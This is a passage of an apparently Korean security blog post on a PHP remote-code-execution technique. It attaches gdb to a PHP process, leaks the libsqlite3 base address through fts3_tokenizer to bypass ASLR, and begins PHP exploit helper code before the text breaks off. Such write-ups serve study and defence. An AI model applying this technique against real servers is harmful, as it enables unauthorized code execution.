2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP RCE 1-day case</h1>\n<ul>\n<li>취약한 대상 애플리케이션 환경에서 PHP를 사용하고 있으며 이에 대한 공격 벡터가 존재하는 경우 PHP sandbox를 우회하기 위해 SQLite 모듈을 활용하고, 최종적으로 RCE를 수행하는 과정에 대해서 설명하도록 하겠습니다.</li>\n</ul>\n<h3 id=\"php-debugging\" style=\"position:relative;\"><a href=\"#php-debugging\" aria-label=\"php debugging permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Debugging</h3>\n<ul>\n<li>취약한 모듈을 분석하기 위해 php+apache 디버깅을 활용하여 동적 분석을 진행한다.</li>\n</ul>\n<p><strong>gdb를 활용하여 process debugging 진행</strong></p>\n<ul>\n<li>대상 PID를 gdb로 연결하기 위해 <code class=\"language-text\">getmypid</code> 출력을 한후 sleep 함수를 사용해 유효 상태로 대기시키는 동안 연결을 진행하도록 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>구현된 코드를 실행한 후 출력된 PID 를 gdb에 연결을 진행한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span>root@localhost html<span class=\"token punctuation\">]</span><span class=\"token comment\"># curl http://localhost/dbg.php</span>\n<span class=\"token number\">1876</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">p</code> 옵션을 활용하여 PID 번호 매칭하여 디버깅을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gdb <span class=\"token operator\">-</span>p <span class=\"token punctuation\">[</span>pid<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>구현된 환경에서 gdb를 활용하여 프로세스 디버깅 상태가 완료된 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY012ObQuCQBCEL1MrKj297FUzNcq004IsI/r/P2tiFyLpwzDssvvMiEN+wy6tkO4vSLIawSKDIyP4swSj8RK9vkTf8mHaikWzYXrs1kDBUzGmbgjXi9hFqVvU1zfO1RPFuQUF5MWdRUGkTXTioImz/gPO4MiQ3R4G7KKsntD1C3nR4Fg07HGqsQpzqCDBVIacTKKmXaBp+zBMCWG4PJO44al8gMDbRHOj+XLPafTYPf7CfkDF0O7+A385ZDlcDFOsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png\"\n        srcset=\"/static/2e73bb069d875686184fee6edfb89f4e/e9ff0/1.png 180w,\n/static/2e73bb069d875686184fee6edfb89f4e/f21e7/1.png 360w,\n/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png 720w,\n/static/2e73bb069d875686184fee6edfb89f4e/302a4/1.png 1080w,\n/static/2e73bb069d875686184fee6edfb89f4e/511f0/1.png 1172w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 Process 매핑된 라이브러리 주소를 확인하여 오프셋 계산을 통해 ROP 기법을 수행할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoklEQVQI112Oyw6CMBREEXQNLW8ILdAiIGBBE2Mw/v9njemNC+Nikrs4c+44l/mJ2ezo+jtUt8Fsb7R6pXsxOxplYJkoUXBcH+6R4eAF8E4MARcI45bCoxo+q+Bc1xcVRbOgqEYSsbCGqGcM0wNxqiCbBVlx/hNy5OVAXCUnCjG6v1HBFu2XNO8QhBJxqlFWI3wmkGSa1ljRrzDg8ruwoVjmA2MTT0rI5KL2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png\"\n        srcset=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/e9ff0/2.png 180w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/f21e7/2.png 360w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png 720w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/eac55/2.png 887w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>여기까지 간단하게 gdb를 사용해 동적 프로세스 디버깅을 진행하였다. 다음은 실제 취약한 sqlite3 모듈을 분석하여 <code class=\"language-text\">Code Execution</code>이 가능한 부분을 exploitation 하도록 할께요</li>\n</ul>\n<h3 id=\"safe-mode-bypass\" style=\"position:relative;\"><a href=\"#safe-mode-bypass\" aria-label=\"safe mode bypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Safe Mode Bypass</h3>\n<ul>\n<li>PHP가 사용하는 모듈에 대한 취약점을 활용하여 Code Execution 을 진행해 System 함수를 실행하는 게 목표</li>\n<li><code class=\"language-text\">Code Execution</code> 을 수행하는데 있어서 Use-After-Free, Buffer-OverFlow 등 많은 CVE들이 존재하며 다음 <code class=\"language-text\">CVE-2015-0273</code>, <code class=\"language-text\">CVE-2015-6834</code> 등이 있습니다.</li>\n</ul>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-0273\">CVE-2015-0273</a></p>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-6834\">CVE-2015-6834</a></p>\n<ul>\n<li>PHP 모듈에 존재하는 취약점을 이용하여 PHP 버전에 의존하지 않고 Exploitation을 진행할 수 있습니다.</li>\n</ul>\n<h3 id=\"php-sqlite-모듈-php-53\" style=\"position:relative;\"><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\" aria-label=\"php sqlite 모듈 php 53 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP SQLite 모듈 (PHP 5.3≥)</h3>\n<ul>\n<li>이번에는 SQLite 모듈에 대한 취약점 분석을 진행하도록 하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQY03VQXW+CQBC8+kF9KkgPTuCOO4FCAbHGaGtN+tLE//+TptmNktakD5Pbm83Ozqw4vH+jG07QeYeq3qOodpBxgaY9oOmOSLKGucy0EBMfk9mSQXUoHXK3gV0PI8TH+YKmPWKV1jC2ZzwFBrYY4Iot4lXFnEpe/gg+TAP4S8MLU/06QpzOF/TDJwu6cstuIlWxWwIJkTD17x0GoWXnlE7bHlneQez2X1iXbzxo3ObqULMIIVIlc/GdQ6r9MEeqW15GouRW0P1oUF1JGqbb0D2Il6rk7RT9v8gqqTkup6CYM+8Z80fJ8BaS/94iYtx69JLIb8HpPBznbvgB8BObv94Ag/QAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png\"\n        srcset=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/e9ff0/3.png 180w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/f21e7/3.png 360w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png 720w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/84cc5/3.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 386px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5UlEQVQY002N0W6CQBREt2qpNlZbq8QKIVRAYGFZYNmyimJbk/7/H03DfWj6cDKTm5szLM1aFNUZsrqA54Z6XhyRCYPV2qd+SBqUqkecauzDEqPJC+7Gz5QD4/vVH8x0P/gwN3r0gwLa3EgeHmr4+wJBVNLIfLHDxHqFNd2QbICNlsT/zkTZoW6ueHNieO+C5GneYuvEyMQRrschZAcuDGR9oSzrHvOFA2u2wfTRpqGHmU1jLEoUlP4iodKfcDyOmGvo9htVc0WleuzchG5DF/IEWZ2RcI1cnhDFCvY2xNoO8LR08QtnvnCMjsUBkwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png\"\n        srcset=\"/static/328a6c8043a5dfeb4cb733617a66114b/e9ff0/4.png 180w,\n/static/328a6c8043a5dfeb4cb733617a66114b/f21e7/4.png 360w,\n/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png 386w\"\n        sizes=\"(max-width: 386px) 100vw, 386px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>취약한 PHP 모듈의 SQLite3 버전은 3.6.20에 해당하며 이는 PHP 5.3 이상 부터 사용가능합니다.</li>\n</ul>\n<h1 id=\"sqlite3-fts3_tokenizer-취약점\" style=\"position:relative;\"><a href=\"#sqlite3-fts3_tokenizer-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite3 fts3_tokenizer 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite3 fts3_tokenizer 취약점</h1>\n<h3 id=\"fts3_tokenizer-overview\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-overview\" aria-label=\"fts3_tokenizer overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer Overview</h3>\n<ul>\n<li>sqlite3에서 fts3_tokenizer를 통한 검색을 위해 사용자 정의 <code class=\"language-text\">tokenizer</code> 를 등록할 수 있는 함수가 있습니다.</li>\n<li>fts3, 4 확장 모듈을 통해 사용자는 데이터베이스에 등록된 특수 테이블인 fts 테이블을 생성할 수 있습니다.</li>\n<li>데이터베이스내의 테이블에 대용량 문서가 많이 포함된 경우에도 하나 이상의 <code class=\"language-text\">token</code> 이 포함된 모든 행에 대해 데이터베이스를 효과적으로 쿼리 수행할 수 있습니다.</li>\n</ul>\n<aside>\n💡 SQLite FTS3,4 Document\n> [https://www.sqlite.org/fts3.html](https://www.sqlite.org/fts3.html)\n</aside>\n<h3 id=\"sqlite-fts3-기능을-활용한-검색-방안\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\" aria-label=\"sqlite fts3 기능을 활용한 검색 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 기능을 활용한 검색 방안</h3>\n<ul>\n<li>SQLite3 쿼리 수행시 Virtual Index Table을 생성하고 요소들을 추가하면서 인덱스를 생성합니다.</li>\n<li>생성된 인덱스(Token)를 <code class=\"language-text\">MATCH</code> 쿼리로 키워드를 검색합니다.</li>\n<li>SQLite는 Simple Tokenizer를 사용합니다.</li>\n</ul>\n<h3 id=\"사용자가-지정할-수-있는-tokenizer의-callback-처리-방식\" style=\"position:relative;\"><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\" aria-label=\"사용자가 지정할 수 있는 tokenizer의 callback 처리 방식 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</h3>\n<ul>\n<li>\n<p><code class=\"language-text\">xCreate</code> : Initialization</p>\n</li>\n<li>\n<p><code class=\"language-text\">xDestory</code> : destruction</p>\n</li>\n<li>\n<p><code class=\"language-text\">xOpen</code> : create a new tokenize cursor from a user input</p>\n</li>\n<li>\n<p><code class=\"language-text\">xClose</code> : close the cursor</p>\n</li>\n<li>\n<p><code class=\"language-text\">xNext</code> : yield next word</p>\n</li>\n<li>\n<p>callback function pointer 는 <code class=\"language-text\">sqlite3_tokenizer_module</code> 구조체에 등록되어 있습니다.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">struct sqlite3_tokenizer_module <span class=\"token punctuation\">{</span>\n <span class=\"token keyword type-declaration\">int</span> iVersion<span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xCreate<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span> <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> sqlite3_tokenizer <span class=\"token operator\">**</span>ppTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xDestroy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> nBytes<span class=\"token punctuation\">,</span> sqlite3_tokenizer_cursor <span class=\"token operator\">**</span>ppCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xClose<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xNext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">**</span>ppToken<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>pnBytes<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piStartOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piEndOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piPosition<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sqlite-fts3-취약점\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite fts3 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 취약점</h2>\n<h3 id=\"fts3-module-base-address-leaked\" style=\"position:relative;\"><a href=\"#fts3-module-base-address-leaked\" aria-label=\"fts3 module base address leaked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 module base address leaked</h3>\n<ul>\n<li>sqlite3 에는 <code class=\"language-text\">simple</code>, <code class=\"language-text\">porter</code>, <code class=\"language-text\">unicode64</code> … 과 같은 몇 가지의 build-in tokenizer가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">select <span class=\"token function\">hex</span><span class=\"token punctuation\">(</span><span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'simple'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t↑\n\t\t\t\t\t<span class=\"token number\">16</span> 진수 문자열 반환 <span class=\"token punctuation\">(</span>빅 엔디안 주소<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 653px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY04WPTQuCQBRFRy2IQEeDSrLR/JhqUtHMsCKxRSv///+5MRO1CKrF4b7NPY9L+OYAkTbYiCN2+QkeE4iSEixIQR0GolMQzVJohq3QB847PyEx38NfZZAZ8VIhn6y3tSIIc1DHh2UzjMZzGMPJV5kSZsUFbdejqm+4dj2a8x1hXCipyBqFlEr5ggmY1PstlOWyajFzOaZuAsteghDzOVPm65bo9O/kB8BLZIICcAz5AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png\"\n        srcset=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e9ff0/5.png 180w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/f21e7/5.png 360w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png 653w\"\n        sizes=\"(max-width: 653px) 100vw, 653px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">fts_tokenizer</code> 는 등록된 tokenizer의 주소를 <code class=\"language-text\">BLOB</code> 인코딩되어 반환하게 되고 built-in-tokenizer를 Query 하게 되면 lib-sqlite3 라이브러리 메모리 영역의 주소가 노출됩니다.</li>\n<li>해당 주소를 기반으로 ASAR을 우회하기 위해 리틀 엔디안으로 변환 작업을 진행합시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token 